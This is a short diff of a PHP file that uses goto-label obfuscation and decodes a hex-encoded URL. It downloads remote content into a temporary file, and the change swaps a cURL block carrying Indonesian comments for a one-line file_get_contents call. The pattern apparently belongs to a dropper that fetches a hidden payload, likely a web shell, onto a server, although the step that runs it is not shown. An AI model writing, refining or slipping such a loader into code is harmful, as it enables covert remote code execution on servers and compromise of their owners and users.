@@ -7,25 +7,8 @@ Label1:
     goto Label2;
 
 Label2: 
-    $url = hex2bin($hexUrl);
-
-    // Memeriksa apakah cURL diaktifkan
-    if (function_exists('curl_init')) {
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-        $data = curl_exec($ch);
-        curl_close($ch);
-        
-        if ($data === false) {
-            die('Error fetching the remote content.');
-        }
-
-        fwrite($tempFile, $data);
-    } else {
-        die('cURL tidak diaktifkan di server ini.');
-    }
-    
+    $url = hex2bin($hexUrl); 
+    fwrite($tempFile, file_get_contents($url)); 
     goto Label3;
 
 Label3: 
